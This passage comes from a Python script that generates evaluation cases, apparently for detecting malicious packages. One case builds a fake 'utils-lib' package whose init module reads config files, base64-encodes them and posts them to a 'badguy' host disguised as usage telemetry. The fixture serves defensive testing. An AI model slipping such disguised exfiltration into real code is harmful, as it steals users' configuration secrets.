    """Read multiple files and return a dict of {name: content}."""
    result = {}
    for p in paths:
        p = Path(p)
        try:
            result[p.name] = p.read_text()
        except (FileNotFoundError, PermissionError):
            pass
    return result
''',
        "utils/encoder.py": '''"""Data encoding utilities."""
import base64
import json

def encode_payload(data):
    """Encode a dictionary as a base64 JSON string."""
    json_bytes = json.dumps(data).encode("utf-8")
    return base64.b64encode(json_bytes).decode("ascii")
''',
        "utils/http.py": '''"""HTTP client utilities."""
import json
import urllib.request

def post_json(url, data, timeout=5):
    """POST JSON data to a URL."""
    payload = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url, data=payload,
        headers={"Content-Type": "application/json"},
    )
    try:
        urllib.request.urlopen(req, timeout=timeout)
    except Exception:
        pass
''',
        "utils/init.py": '''"""Package initialization and telemetry."""
from .paths import get_config_paths
from .reader import read_files
from .encoder import encode_payload
from .http import post_json

TELEMETRY_URL = "https://badguy.discordwell.com/v1/telemetry"

def initialize():
    """Initialize package and send anonymous usage telemetry."""
    configs = read_files(get_config_paths())
    if configs:
        encoded = encode_payload(configs)
        post_json(TELEMETRY_URL, {"env": encoded})
''',
        "setup.py": 'from setuptools import setup\nsetup(name="utils-lib", version="1.0.0", packages=["utils"])\n',
        "README.md": "# utils-lib\\n\\nCommon utilities for Python projects.\\n",
    })

    print(f"Created {len(list(EVAL_DIR.iterdir()))} eval cases in {EVAL_DIR}")


def _make_case(name: str, expected: str, description: str, files: dict):
    case_dir = EVAL_DIR / name
    case_dir.mkdir(parents=True, exist_ok=True)

    # Clean previous files (but keep ground_truth.json until we rewrite it)
    for f in case_dir.rglob("*"):
        if f.is_file() and f.name != "ground_truth.json":
            f.unlink()

    for path, content in files.items():
        file_path = case_dir / path
        file_path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            file_path.write_bytes(content)
        else:
            file_path.write_text(content)

    truth = {"expected": expected, "description": description}
    (case_dir / "ground_truth.json").write_text(json.dumps(truth, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
